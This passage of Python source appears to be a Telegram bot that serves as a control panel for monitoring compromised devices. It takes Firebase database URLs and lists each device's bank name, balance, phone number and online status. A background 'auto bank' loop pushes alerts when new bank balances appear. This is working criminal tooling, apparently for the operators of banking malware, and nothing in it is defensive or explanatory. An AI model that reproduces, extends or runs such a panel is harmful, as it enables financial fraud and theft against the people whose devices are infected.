    text = update.message.text.strip() if update.message.text else ""
    uid = update.effective_user.id
    
    if state == "auto_add":
        urls = auto_detect_and_clean(text)
        if not urls:
            await update.message.reply_text(
                "❌ <b>No Firebase URL found</b>",
                reply_markup=cancel_kb(), parse_mode='HTML'
            )
            return
        
        added = add_user_firebases(uid, urls)
        cnt = len(get_user_firebases(uid))
        
        # ✅ SINGLE NOTIFICATION — sirf agar naya add hua
        if added > 0:
            await update.message.reply_text(
                f"✅ <b>+{added} Firebase(s) added</b>\n"
                f"📊 Total: <b>{cnt}</b>",
                reply_markup=main_menu_kb(uid), parse_mode='HTML'
            )
        # Agar duplicate — silent, kuch nahi bhejna
        
        context.user_data["state"] = None
        return
    
    if state == "add_single":
        url = clean_url(text)
        if not url:
            await update.message.reply_text("❌ Invalid URL", reply_markup=cancel_kb(), parse_mode='HTML')
            return
        if add_user_firebase(uid, url):
            cnt = len(get_user_firebases(uid))
            await update.message.reply_text(
                f"✅ <b>Added!</b>\n📊 Total: <b>{cnt}</b>",
                reply_markup=main_menu_kb(uid), parse_mode='HTML'
            )
        else:
            await update.message.reply_text("⚠️ Already exists", reply_markup=main_menu_kb(uid), parse_mode='HTML')
        context.user_data["state"] = None
        return
    
    if state == "add_multiple":
        urls = auto_detect_and_clean(text)
        if not urls:
            await update.message.reply_text("❌ No valid URLs", reply_markup=cancel_kb(), parse_mode='HTML')
            return
        added = add_user_firebases(uid, urls)
        cnt = len(get_user_firebases(uid))
        await update.message.reply_text(
            f"✅ <b>+{added} added</b>\n📊 Total: <b>{cnt}</b>",
            reply_markup=main_menu_kb(uid), parse_mode='HTML'
        )
        context.user_data["state"] = None
        return
    
    # No state — try auto detect
    urls = auto_detect_and_clean(text)
    if urls:
        added = add_user_firebases(uid, urls)
        cnt = len(get_user_firebases(uid))
        if added > 0:
            await update.message.reply_text(
                f"✅ <b>+{added} added</b>\n📊 Total: <b>{cnt}</b>",
                reply_markup=main_menu_kb(uid), parse_mode='HTML'
            )
        return
    
    context.user_data["state"] = None
    await update.message.reply_text(menu_text(uid), reply_markup=main_menu_kb(uid), parse_mode='HTML')

# ============================================================
# AUTO BANK
# ============================================================
async def auto_scanner(app):
    while True:
        try:
            await asyncio.sleep(AUTO_SCAN_INTERVAL)
            for uid in list(USER_FIREBASES.keys()):
                if not is_auto_scan_on(uid): continue
                urls = get_user_firebases(uid)
                if not urls: continue
                try:
                    results = await analyze_firebases(urls)
                    cur = USER_LAST_BANKS.get(uid, {})
                    new = {}
                    alerts = []
                    for fb in results:
                        for d in fb.get("devices", []):
                            k = f"{fb.get('firebase_url','')}|{d.get('id','')}"
                            b = d.get("bank_name", "—")
                            bal = d.get("balance", "—")
                            if b not in ["—", "Unknown"]:
                                new[k] = f"{b}|{bal}"
                                if (k not in cur or cur[k] != new[k]) and bal != "—":
                                    alerts.append({"url": fb.get("firebase_url", ""), "did": d.get("id", ""),
                                                   "b": b, "bal": bal, "phone": d.get("phone", "—")})
                    USER_LAST_BANKS[uid] = new
                    for a in alerts[:5]:
                        try:
                            txt = (f"🏦 <b>NEW BANK!</b>\n\n"
                                   f"🌐 <code>{escape_html(a['url'])}</code>\n"
                                   f"🆔 <code>{escape_html(a['did'])}</code>\n"
                                   f"📞 <code>{escape_html(a['phone'])}</code>\n"
                                   f"🏦 <b>{escape_html(a['b'])}</b>\n"
                                   f"💰 <b>{escape_html(a['bal'])}</b>")
                            await app.bot.send_message(chat_id=uid, text=txt, parse_mode='HTML', disable_web_page_preview=True)
                            await asyncio.sleep(1)
                        except: pass
                except: pass
        except Exception as e:
            logger.error(f"Auto: {e}")
            await asyncio.sleep(10)

# ============================================================
# POST INIT
# ============================================================
async def post_init(app):
    try:
        await app.bot.set_my_commands([
            BotCommand("start", "🏠 Main Menu"),
            BotCommand("auto", "📥 Paste Firebase"),
            BotCommand("showall", "💰 Balance Devices"),
            BotCommand("full", "📊 Full Analysis"),
            BotCommand("online", "🟢 Online Only"),
            BotCommand("list", "📋 List Firebases"),
            BotCommand("autobank", "🏦 Auto Bank"),
            BotCommand("deleteall", "🗑 Delete All"),
            BotCommand("help", "❓ Help"),
        ])
        logger.info("✅ Commands set")
    except Exception as e: logger.warning(f"Cmd: {e}")
    asyncio.create_task(auto_scanner(app))
    logger.info("🏦 Auto scanner started")

# ============================================================
# QUICK COMMANDS
# ============================================================
async def auto_cmd(u, c):
    c.user_data["state"] = "auto_add"
    await u.message.reply_text("📥 Paste Firebase URL(s):", reply_markup=cancel_kb(), parse_mode='HTML')

async def showall_cmd(u, c):
    uid = u.effective_user.id
    urls = get_user_firebases(uid)
    if not urls:
        await u.message.reply_text("❌ No firebases.", reply_markup=main_menu_kb(uid), parse_mode='HTML')
        return
    msg = await u.message.reply_text(f"💰 <b>Scanning {len(urls)}...</b>", parse_mode='HTML')
    results = await analyze_firebases(urls)
    text = format_balance_only(results)
    await safe_send(u.effective_chat.id, text, c.bot)

async def full_cmd(u, c):
    uid = u.effective_user.id
    urls = get_user_firebases(uid)
    if not urls:
        await u.message.reply_text("❌ No firebases."); return
    msg = await u.message.reply_text(f"📊 Analyzing {len(urls)}...")
    results = await analyze_firebases(urls)
    chunks = format_results(results)
    for i, ch in enumerate(chunks):
        await safe_send(u.effective_chat.id, ch, c.bot)
        if i < len(chunks) - 1: await asyncio.sleep(PAGE_DELAY)

async def list_cmd(u, c):
    uid = u.effective_user.id
    urls = get_user_firebases(uid)
    if not urls:
        await u.message.reply_text("📋 No firebases.", reply_markup=main_menu_kb(uid), parse_mode='HTML')
        return
    text = f"📋 <b>Firebases ({len(urls)})</b>\n\n"
    for i, x in enumerate(urls, 1):
        text += f"{i}. <code>{escape_html(x)}</code>\n"
    await u.message.reply_text(text[:4000], reply_markup=back_kb(), parse_mode='HTML')

async def online_cmd(u, c):
    uid = u.effective_user.id
    urls = get_user_firebases(uid)
    if not urls:
        await u.message.reply_text("❌ No firebases."); return
    await u.message.reply_text("🟢 Scanning...")
    results = await analyze_firebases(urls)
    text = format_online_only(results)
    await safe_send(u.effective_chat.id, text, c.bot)

async def autobank_cmd(u, c):
    uid = u.effective_user.id
    cur = is_auto_scan_on(uid)
    set_auto_scan(uid, not cur)
    st = "🟢 ON" if not cur else "🔴 OFF"
    await u.message.reply_text(f"🏦 Auto Bank: {st}", reply_markup=main_menu_kb(uid), parse_mode='HTML')

async def deleteall_cmd(u, c):
    uid = u.effective_user.id
    cnt = len(get_user_firebases(uid))
    if cnt == 0:
        await u.message.reply_text("❌ Nothing."); return
    clear_user_firebases(uid)
    await u.message.reply_text(f"✅ Deleted {cnt}.", reply_markup=main_menu_kb(uid), parse_mode='HTML')

async def error_handler(update, context):
    logger.error(f"Error: {context.error}")
    if isinstance(context.error, (TimedOut, NetworkError)): return

# ============================================================
# MAIN
# ============================================================
def main():
    logger.info("=" * 50)
    logger.info(f"🤖 {BOT_NAME}")
    logger.info("=" * 50)
    try:
        r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=10)
        d = r.json()
        if not d.get("ok"):
            logger.error(f"❌ {d}"); sys.exit(1)
        logger.info(f"✅ Bot: @{d['result'].get('username')}")
    except Exception as e:
        logger.error(f"❌ {e}"); sys.exit(1)
    try:
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook", timeout=5)
        logger.info("✅ Webhook deleted")
    except: pass
    
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("menu", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("auto", auto_cmd))
    app.add_handler(CommandHandler("showall", showall_cmd))
    app.add_handler(CommandHandler("full", full_cmd))
    app.add_handler(CommandHandler("list", list_cmd))
    app.add_handler(CommandHandler("online", online_cmd))
    app.add_handler(CommandHandler("autobank", autobank_cmd))
    app.add_handler(CommandHandler("deleteall", deleteall_cmd))
    
    app.add_handler(CallbackQueryHandler(menu_callback, pattern="^menu$"))
    app.add_handler(CallbackQueryHandler(noop_callback, pattern="^noop$"))
    app.add_handler(CallbackQueryHandler(auto_add_cb, pattern="^auto_add$"))
    app.add_handler(CallbackQueryHandler(add_single_cb, pattern="^add_single$"))
    app.add_handler(CallbackQueryHandler(add_multiple_cb, pattern="^add_multiple$"))
    app.add_handler(CallbackQueryHandler(list_cb, pattern="^list_fb$"))
    app.add_handler(CallbackQueryHandler(show_all_cb, pattern="^show_all$"))
    app.add_handler(CallbackQueryHandler(recheck_cb, pattern="^recheck$"))
    app.add_handler(CallbackQueryHandler(analyze_cb, pattern="^analyze$"))
    app.add_handler(CallbackQueryHandler(online_cb, pattern="^online_only$"))
    app.add_handler(CallbackQueryHandler(toggle_auto_cb, pattern="^toggle_auto$"))
    app.add_handler(CallbackQueryHandler(delete_all_cb, pattern="^delete_all$"))
    app.add_handler(CallbackQueryHandler(confirm_del_cb, pattern="^confirm_delete$"))
    app.add_handler(CallbackQueryHandler(help_menu_cb, pattern="^help_menu$"))
    
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_msg))
    app.add_error_handler(error_handler)
    
    logger.info("🤖 Polling...")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True, poll_interval=1.0, timeout=30)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: logger.info("Stopped")
    except Exception as e: logger.error(f"Fatal: {e}\n{traceback.format_exc()}"); sys.exit(1)